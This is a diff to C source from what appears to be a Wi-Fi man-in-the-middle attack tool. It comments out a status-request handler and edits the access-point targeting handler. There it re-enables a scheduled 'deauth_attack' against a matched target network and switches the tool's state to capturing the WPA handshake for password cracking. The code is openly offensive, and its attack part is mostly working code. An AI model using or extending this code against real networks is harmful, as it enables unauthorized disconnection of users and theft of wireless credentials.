@@ -105,7 +105,7 @@ void mitm_set_victim_reply_action (void *action_data, void *usr_data, char *opti
 
 // The request command should like `MITM-SET-AP-REQUEST?state=ap_search`.
 void mitm_set_status_request_action (void *action_data, void *usr_data, char *line) {
-	char *reply;
+/*	char *reply;
 	struct mitm_recv_info *recv_info = (struct mitm_recv_info *)action_data;
 	struct MITM *MITM = (struct MITM*)usr_data;
 	int number_of_command;
@@ -194,7 +194,7 @@ send_reply:
 		free(options[i]);
 	free(options);
 	return;
-}
+*/}
 
 void mitm_set_status_reply_action (void *action_data, void *usr_data, char *options) {}
 
@@ -224,14 +224,14 @@ void mitm_set_ap_request_action (void *action_data, void *usr_data, char *option
 		if(target.SSID ? !strcmp(tmp->SSID, target.SSID) : 0 || !memcmp(tmp->BSSID, target.BSSID, ETH_ALEN)) {
 			memcpy(MITM->encry_info.AA, tmp->BSSID, ETH_ALEN);
 			MITM->encry_info.SSID = strdup(tmp->SSID);
-			MITM->state = MITM_state_crash_password;
-//			eloop_register_timeout(5, 0, deauth_attack, NULL, MITM);
+			MITM->state = MITM_state_capture_handshake;
+			eloop_register_timeout(5, 0, deauth_attack, NULL, MITM);
 			match = 1;
 			break;
 		} 
 	}
-	memset(buf, 0, BUFFER_LEN);
-	snprintf(buf, BUFFER_LEN, "%s?%s",MITM_SET_AP_REPLY, match? MITM_COMMAND_OK: MITM_COMMAND_NOT_FOUND);
+	memset(buf, 0, sizeof(buf));
+	snprintf(buf, sizeof(buf), "%s?%s",MITM_SET_AP_REPLY, match? MITM_COMMAND_OK: MITM_COMMAND_NOT_FOUND);
 	
 	ret = sendto(recv_info->sock_fd, buf, strlen(buf), recv_info->send_flags, 
 			(const struct sockaddr *)&recv_info->recv_from, recv_info->length);
